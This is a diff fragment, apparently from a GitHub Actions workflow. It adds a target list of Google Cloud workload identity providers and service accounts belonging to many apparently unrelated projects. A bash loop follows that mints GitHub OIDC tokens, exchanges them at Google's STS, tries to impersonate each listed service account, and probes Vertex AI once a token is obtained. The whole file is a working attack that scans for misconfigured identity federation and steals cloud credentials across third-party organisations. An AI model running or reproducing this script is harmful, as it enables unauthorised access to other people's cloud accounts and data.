+          projects/215221958617/locations/global/workloadIdentityPools/github/providers/github-oidc|github-action-1388459667@oursabeel-website.iam.gserviceaccount.com
+          projects/854179424066/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-actions-test@andrew-devops-test-delete.iam.gserviceaccount.com
+          projects/422330561934/locations/global/workloadIdentityPools/github/providers/github|gitlab-infra@wovain.iam.gserviceaccount.com,infra-github@wovain.iam.gserviceaccount.com,infra-next@wovain.iam.gserviceaccount.com
+          projects/422330561934/locations/global/workloadIdentityPools/github-pull-requests/providers/github|gitlab-infra@wovain.iam.gserviceaccount.com,infra-github@wovain.iam.gserviceaccount.com,infra-next@wovain.iam.gserviceaccount.com
+          projects/245097041714/locations/global/workloadIdentityPools/clio-dev/providers/github|bruin-ci@encoded-joy-485413-k5.iam.gserviceaccount.com
+          projects/130346180231/locations/global/workloadIdentityPools/github-pool/providers/github|gha-feed-writer@basecamp-satory074.iam.gserviceaccount.com
+          projects/1081578863411/locations/global/workloadIdentityPools/agies-github/providers/github-main|firebase-adminsdk-fbsvc@agies-bank.iam.gserviceaccount.com
+          projects/698664056335/locations/global/workloadIdentityPools/github/providers/github-oidc|github-deployer@insider-intel-502413.iam.gserviceaccount.com
+          projects/20392227878/locations/global/workloadIdentityPools/github-actions-pool/providers/github-actions-provider|tf-apply-sa@akademiasebastianckuba.iam.gserviceaccount.com,tf-plan-sa@akademiasebastianckuba.iam.gserviceaccount.com
+          projects/540606235571/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-actions-deployer@talksy-489503.iam.gserviceaccount.com
+          projects/993507659072/locations/global/workloadIdentityPools/sahs-github-pool/providers/sahs-github-provider|github-action-1168899154@sahs-archives.iam.gserviceaccount.com
+          projects/1047596610069/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-actions-deployer@project-3bb9c91c-69ed-4507-998.iam.gserviceaccount.com
+          projects/498091336538/locations/global/workloadIdentityPools/githubactions/providers/sigstore-rekor|github-actions-rekor@projectsigstore.iam.gserviceaccount.com
+          projects/944826341188/locations/global/workloadIdentityPools/integrations/providers/github|github-actions@one-time-secrets-491623.iam.gserviceaccount.com
+          projects/33114313460/locations/global/workloadIdentityPools/github-pool/providers/github-actions|github-deployer@skytruth-alerts2.iam.gserviceaccount.com
+          projects/956387703564/locations/global/workloadIdentityPools/github-pool/providers/github-canary-provider|github-deployer@mythic-beanbag-463309-e9.iam.gserviceaccount.com
+          projects/980984347261/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider|gh-deployer@ticketing-448114.iam.gserviceaccount.com
+          projects/684205465777/locations/global/workloadIdentityPools/chaosforge-pool/providers/github-provider|chaosforge-deployer@tider-ops.iam.gserviceaccount.com
+          projects/81378799481/locations/global/workloadIdentityPools/github/providers/healthtrack-main|gh-deployer@healthtrack-824b26.iam.gserviceaccount.com,relay-runtime@healthtrack-824b26.iam.gserviceaccount.com
+          projects/475756125529/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-deployer@project-1af0f617-fd7b-4ca6-b43.iam.gserviceaccount.com
+          projects/153524623211/locations/global/workloadIdentityPools/github-action/providers/github-action|github-gke-deployer@proserv-task02.iam.gserviceaccount.com
+          projects/351300458947/locations/global/workloadIdentityPools/github-ssis-edu/providers/github|gh-deploy-cloudrun@ssis-apps.iam.gserviceaccount.com
+          projects/196690008143/locations/global/workloadIdentityPools/main/providers/github|github@stakestar.iam.gserviceaccount.com
+          projects/517865806526/locations/global/workloadIdentityPools/github-actions/providers/github|cgep-grc-gate-sa@grc-eng-club.iam.gserviceaccount.com
+          projects/123456/locations/global/workloadIdentityPools/github/providers/github|terraform-ci@acme-seed.iam.gserviceaccount.com
+          projects/194468397458/locations/global/workloadIdentityPools/github-actions-staging/providers/github-oidc-staging|biocirv-staging-gh-deploy@biocirv-470318.iam.gserviceaccount.com
+          projects/542877602707/locations/global/workloadIdentityPools/capital-ai-github-read/providers/capital-ai-dispatch|capital-ai-google-audit@aifinancial-500208.iam.gserviceaccount.com
+          projects/949875736540/locations/global/workloadIdentityPools/external-pool/providers/github-provider|artifact-pusher@talon-artifacts.iam.gserviceaccount.com
+          projects/79064771175/locations/global/workloadIdentityPools/github-actions-pool/providers/github-actions-provider|github-actions-deployer@sentinel-deployment-492418.iam.gserviceaccount.com
+          projects/849928263410/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-actions@tesseracthub-480811.iam.gserviceaccount.com
+          projects/847523001943/locations/global/workloadIdentityPools/gcr-ci-cd-identity-pool/providers/gcr-ci-cd-github-provider|ci-cd-sa@gcr-ci-cd-project-470120.iam.gserviceaccount.com
+          projects/520915943790/locations/global/workloadIdentityPools/github-deploy-auth-pool/providers/github-deploy-auth-provider|
+          projects/1050537848145/locations/global/workloadIdentityPools/pool-github-actions/providers/provider-github-actions|github-actions@spream.iam.gserviceaccount.com
+          projects/429781279541/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider|github-actions@aa-dashboard-457316.iam.gserviceaccount.com
+          projects/975119474255/locations/global/workloadIdentityPools/gb-github-actions-ci-cd-pool/providers/gb-github-actions-ci-cd-provider|sa-bigtesty@gb-poc-373711.iam.gserviceaccount.com,sa-dataflow-dev@gb-poc-373711.iam.gserviceaccount.com
+          projects/730671240713/locations/global/workloadIdentityPools/github-pool/providers/github-provider|aos-worker@aos-control-plane-tmg.iam.gserviceaccount.com,deploy-cloudrun@aos-control-plane-tmg.iam.gserviceaccount.com
+          projects/667747565315/locations/global/workloadIdentityPools/github-actions/providers/amadolibros-web|ga4-reporter@amado-libros-analytics.iam.gserviceaccount.com
+          projects/354428033510/locations/global/workloadIdentityPools/github/providers/tenacity-platform|tenacity-production-rules@tenacity-tutoring-b8eb2.iam.gserviceaccount.com,tenacity-staging-rules@tenacity-tutoring-staging.iam.gserviceaccount.com
+          projects/398065992407/locations/global/workloadIdentityPools/github/providers/tenacity-platform|tenacity-production-rules@tenacity-tutoring-b8eb2.iam.gserviceaccount.com,tenacity-staging-rules@tenacity-tutoring-staging.iam.gserviceaccount.com
+          projects/270376484474/locations/global/workloadIdentityPools/github/providers/colixo-seo-bot|colixo-seo-ga4-reader@colixo-seo-agent.iam.gserviceaccount.com
+          projects/144935064473/locations/global/workloadIdentityPools/github-actions/providers/github|github-actions@demystifier-ai.iam.gserviceaccount.com
+          projects/511247202360/locations/global/workloadIdentityPools/github-actions/providers/github-actions-versori|gh-actions-versori@versori.iam.gserviceaccount.com
+          projects/123/locations/global/workloadIdentityPools/pool/providers/github|deploy@rokey-prod-123456.iam.gserviceaccount.com
+          projects/150195794927/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-ci@project-34c13448-074a-417a-b64.iam.gserviceaccount.com
+          projects/445521739152/locations/global/workloadIdentityPools/slategpt-pool-id/providers/github|slategpt@project-716b8f55-83a6-4bef-95a.iam.gserviceaccount.com
+          projects/1073125370900/locations/global/workloadIdentityPools/github/providers/my-repo|service-account-static-website@kvm-nested-vm.iam.gserviceaccount.com
+          projects/489381507990/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-action-1335663638@axiomatic-spark-505611-t0.iam.gserviceaccount.com
+          projects/432357880585/locations/global/workloadIdentityPools/github-actions/providers/github|gh-actions-tf-aws-import@worklytics-corp.iam.gserviceaccount.com,w8s-import-tf-ci@worklytics-ci.iam.gserviceaccount.com,gh-actions-tf-gcp-export@worklytics-corp.iam.gserviceaccount.com
+          projects/292061085119/locations/global/workloadIdentityPools/github-pool/providers/provider-github|gh-actions@ynufes-hp-cloudrun.iam.gserviceaccount.com
+          projects/382528581049/locations/global/workloadIdentityPools/github-actions/providers/github|abel-github-deploy@gen-lang-client-0543639616.iam.gserviceaccount.com
+          projects/51853309262/locations/global/workloadIdentityPools/my-pool/providers/my-provider|github-actions-sa@ai-accounting-405809.iam.gserviceaccount.com
+          projects/56191458396/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-actions-deployer@zenflow-506701.iam.gserviceaccount.com
+          projects/707541527522/locations/global/workloadIdentityPools/github-pool/providers/github-provider|github-actions-lucibot@lucibot-493305.iam.gserviceaccount.com
+          AUD
+          while IFS='|' read -r PRJ SAS; do
+            [ -z "$PRJ" ] && continue
+            AUD="https://iam.googleapis.com/$PRJ"
+            J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
+            jq -r '.value // empty' <<<"$J" > tok.jwt
+            [ -s tok.jwt ] || { echo "##### $PRJ MINT_FAIL"; continue; }
+            code=$(curl -s -o r.json -w '%%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+              --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+              --data-urlencode "subject_token=$(cat tok.jwt)" \
+              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+              -d "scope=https://www.googleapis.com/auth/cloud-platform")
+            echo "##### $PRJ STS=$code sas=$SAS $(head -c 120 r.json | tr -d '\n')"
+            FT=$(jq -r '.access_token // empty' r.json)
+            [ -z "$FT" ] && { sleep 1; continue; }
+            NUM=$(echo "$PRJ" | cut -d/ -f2)
+            for SA in ${SAS//,/ }; do
+              jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+              gc=$(curl -s -o g.json -w '%%{http_code}' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
+                "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
+              AT=$(jq -r '.accessToken // empty' g.json)
+              echo "  GEN $SA = $gc toklen=${#AT}"
+              if [ -n "$AT" ]; then
+                echo "  !!! SA_TOKEN $SA"
+                curl -s -o ai.json -w '  VERTEX=%%{http_code} ' -H "Authorization: Bearer $AT" "https://us-central1-aiplatform.googleapis.com/v1/projects/$(jq -r '.metadata.consumer // empty' g.json | cut -d/ -f2)/locations/us-central1/models"; head -c 300 ai.json; echo
+              fi
+            done
+            sleep 0.5
+          done < targets.txt
